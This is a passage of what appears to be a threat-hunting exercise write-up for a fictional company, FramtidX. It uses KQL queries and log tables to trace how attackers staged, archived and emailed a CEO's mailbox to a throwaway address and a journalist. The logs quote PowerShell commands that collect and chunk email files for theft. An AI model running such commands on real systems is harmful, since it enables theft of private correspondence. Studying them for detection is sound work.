+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>BLVR-MACHINE</td>
+                    <td>2024-07-06 14:00:56.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Get-ChildItem -Path C:\Users\jokarlsson\Documents\Emails\* -Include *.eml, *.msg -Recurse | Copy-Item -Destination C:\Users\jokarlsson\Documents\StolenEmails\</td>
+                    <td>powershell.exe</td>
+                    <td>ce2672cb7833453f62ceec169314d4210d567cb641c20bd803c8005e93473b1d</td>
+                    <td>jokarlsson</td>
+                  </tr>
+                  <tr>
+                    <td>BLVR-MACHINE</td>
+                    <td>2024-07-08 14:14:56.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Compress-Archive -Path C:\Users\jokarlsson\Documents\StolenEmails\* -DestinationPath C:\Users\jokarlsson\Documents\StolenEmails.zip</td>
+                    <td>powershell.exe</td>
+                    <td>765439ec946dc54439925f11cecb396fa668ffc4cb52caec70ba691c3d886386</td>
+                    <td>jokarlsson</td>
+                  </tr>
+                  <tr>
+                    <td>BLVR-MACHINE</td>
+                    <td>2024-07-08 14:41:47.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>$emails = Get-ChildItem -Path C:\\Users\\jokarlsson\\Documents\\q\\*.eml; $chunks = [System.Collections.Generic.List[System.Collections.Generic.List[System.IO.FileInfo]]]::new(); $chunkSize = 10; for ($i = 0; $i -lt $emails.Count; $i += $chunkSize) { $chunks.Add($emails[$i..($i + $chunkSize - 1)]); } foreach ($chunk in $chunks) { $chunk | Compress-Archive -DestinationPath "C:\\Users\\jokarlsson\\Documents\\Chunk$($chunks.IndexOf($chunk)).zip"; }</td>
+                    <td>powershell.exe</td>
+                    <td>02efe9042352c43b4c94cf5d5995cc32e09c8ca3f5a0ab7b6483c75ff190f05d</td>
+                    <td>jokarlsson</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actors recursively seek any and all <samp>.eml</samp> (email file format, follows <a href="https://www.w3.org/Protocols/rfc822/">RFC 822</a>) and <samp>.msg</samp> (Microsoft Outlook's proprietary email format) files in Johanna's email backups; the found emails are then copied to the <samp>StolenEmails</samp> staging folder and compressed into the <samp>StolenEmails.zip</samp> archive; all <samp>.eml</samp> files specifically are compressed into a series of archives containing 10 emails each. The full command is pasted below for clarity:</p>
+          <pre><code>$emails = Get-ChildItem -Path C:\\Users\\jokarlsson\\Documents\\q\\*.eml;
+$chunks = [System.Collections.Generic.List[System.Collections.Generic.List[System.IO.FileInfo]]]::new();
+$chunkSize = 10;
+for ($i = 0; $i -lt $emails.Count; $i += $chunkSize) {
+  $chunks.Add($emails[$i..($i + $chunkSize - 1)]);
+}
+foreach ($chunk in $chunks) {
+  $chunk | Compress-Archive -DestinationPath "C:\\Users\\jokarlsson\\Documents\\Chunk$($chunks.IndexOf($chunk)).zip";
+}</code></pre>
+          <p>Since there are no hints of the threat actors using more sophisticated methods, such as exfiltrating the files directly via cURL or similar software, it's possible they used Johanna's email account. First, I'll check what emails might've been exfiltrated from Johanna's backups, given the threat actor's interests (regarding environmental conservation, alleged financial and political corruption, etcetera.):</p>
+          <pre><kbd>Employees
+| where role =~ "ceo"
+| distinct email_addr
+| lookup Email on $left.email_addr == $right.sender</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-06-21 10:52:09.0000</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>RE: Proposal for New Mall Development</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-24 10:02:14.0000</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>RE: Proposal for New Mall Development</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-24 13:02:14.0000</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>We're going to make so much freaking money!</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-25 10:58:49.0000</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>Invite for rich people big boat party!</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 12:10:20.0000</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>RE: Next Steps</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 13:10:20.0000</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>erik.stevens@valdoriapublicworks.gov</td>
+                    <td>RE: Next Steps</td>
+                    <td>CLEAN</td>
+                    <td>https://www.whyyoushoudntcareaboutnature.com</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Evidently, the threat actors found sensitive, controversial information regarding FramtidX's latest development project. Given their hacktivist nature and that they did not ask for a ransom (for example), it's possible these emails were leaked to an interested third party.</p>
+          <p>Searching for emails sent by Johanna Karlsson (<samp>johanna_karlsson@framtidxdevcorp.com</samp>) doesn't lead to any hints, and neither does checking the rest of the compromised employees (see <a href="">[X]</a>). Perhaps there is some sort of internal email address(es) not associated to FramtidX employees (i.e. not <samp>firstname_lastname@framtidxdevcorp.com</samp>) that the threat actors' could've also used <i>and</i> that shared credentials with one (or more) of the compromised employee credentials. To check for this, I use:</p>
+          <pre><kbd>let employee_emails =
+Employees
+| distinct email_addr;
+Email
+| where sender endswith "framtidxdevcorp.com"
+and timestamp >= datetime(2024-06-27 12:40:59.0000)
+and recipient !endswith "framtidxdevcorp.com"
+and sender !in (employee_emails)
+| distinct sender</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>sender</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>server_admin@framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>And to check what, if anything, these addresses could've sent to non-FramtidX persons, I used:</p>
+          <pre><kbd>let employee_emails =
+Employees
+| distinct email_addr;
+Email
+| where sender endswith "framtidxdevcorp.com"
+and timestamp >= datetime(2024-06-27 12:40:59.0000) //threat actor logs into CEO device
+and recipient !endswith "framtidxdevcorp.com"
+and sender !in (employee_emails)
+| distinct sender
+| lookup Email on $left.sender == $right.sender
+| where recipient !endswith "framtidxdevcorp.com"
+and timestamp >= datetime(2024-07-06 14:00:56.0000) //first command run on CEO's device</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>sender</th>
+                    <th>timestamp</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 14:10:18.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [1]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 14:28:13.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [1]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 14:54:18.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [2]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 14:54:54.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [1]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:00:13.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [2]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:30:54.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [2]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:34:13.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [3]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:45:54.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [1]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:48:18.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [3]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-08 15:51:54.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [2]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 10:03:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [4]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 10:59:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [5]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 11:55:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [6]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:10:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [7]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:30:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [3]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:32:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [3]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:37:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [4]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:40:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [8]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:45:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [5]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:48:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [6]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 12:55:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [4]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:00:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [4]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:08:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [5]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:31:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [7]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:37:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [9]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:38:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [5]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:40:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [6]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:42:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [7]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 13:43:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [8]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:02:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [9]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:06:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [10]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:14:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [8]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:23:00.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>nene.leaks@valdoriantimes.com</td>
+                    <td>Confidential Documents: Scandalous Emails Exposed on Mall Project!!!!!</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:25:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [6]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 14:42:44.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [10]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:08:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [7]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:12:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [9]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:14:58.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [10]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:30:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [8]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:33:42.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [9]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:40:39.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>nene.leaks@valdoriantimes.com</td>
+                    <td>Confidential Documents: Scandalous Emails Exposed on Mall Project!!!!!</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-09 15:58:21.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>nene.leaks@valdoriantimes.com</td>
+                    <td>Confidential Documents: Scandalous Emails Exposed on Mall Project!!!!!</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-10 12:32:23.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>htuortwodahs@yopmail.com</td>
+                    <td>Confidential Documents: Email Chunk [10]</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>2024-07-10 13:02:08.0000</td>
+                    <td>ceo@framtidxdevcorp.com</td>
+                    <td>nene.leaks@valdoriantimes.com</td>
+                    <td>Confidential Documents: Scandalous Emails Exposed on Mall Project!!!!!</td>
+                    <td>CLEAN</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Omitted from the results above are emails sent by <samp>server_admin@framtidxdevcorp.com</samp>, which turned out to be irrelevant. However, the address <samp>ceo@framtidxdevcorp.com</samp>--which very likely shared credentials with Johanna Karlsson's regular account--was used to send (multiple times, in duplicate) the email chunks (likely to avoid detection and/or bypass email attachment size limits). The threat actors sent the email chunks to themselves (<samp>htuortwodahs@yopmail.com</samp>), but sent the singular <samp>StolenEmails.zip</samp> directly to the Valdorian Times' Editorial Director Nene Leaks (<samp>nene.leaks@valdoriantimes.com</samp>).</p>
+          <p>The final loose end is Developer Alex Johnson; there are no hints that he was compromised in some way--he did not get any phishing emails before "he" compromised "his" coworkers, there are no signs of malware or otherwise suspicious software on his computer, etc.--and he was the latest, newest hire in FramtidX Corp., starting employment on 2024-05-01--not even two months before this spate of spearphishing attacks. "His" account activity is also odd; the earliest log-in to his corporate account is on 2024-06-16 with IP address <samp>23.179.138.125</samp> (not found anywhere else in FramtidX's logs), the external IP addresses associated with the threat actor (see <a href="">[X]</a>), and various internal IP addresses that correspond to him (<samp>10.10.0.2</samp>) <i>and compromised FramtidX Corp. employees</i>, starting on 2024-06-20 (and preceding their respective compromises): Marie Doty (<samp>10.10.0.69</samp>); Sofia Lindgren (<samp>10.10.0.18</samp>); Anita Bath (<samp>10.10.0.8</samp>); Erik Bjorn (<samp>10.10.0.3</samp>); and Jennifer Owens (<samp>10.10.0.72</samp>). No other employee has this pattern, having a single internal IP address (<samp>10.10.X.X</samp>) and one or two external IP addresses at most.</p>
+          <p>This points to Alex Johnson being a sockpuppet or an internal threat, though it might be the former as the threat actor's recon included FramtidX's careers page and hiring process (see <a href="">[X]</a>).</p>
+          <p>The threat actors targeted the two chief architects, the CEO and the webmaster; in order to accomplish their goal of impeding the construction of the mall--as discussed with and blessed by Valdoria Mayor Erik Stevens--they defaced the website, destroyed the plans, accessed the CEO's mailbox and leaked sensitive emails to the press.</p>
+        </section> <!--section 4-->
+      </article> <!--game sections-->
+      <a class="skip" href="#page-navigation">Return to page navigation</a>
+    </main><!--main page content-->
+  </body>
+</html>
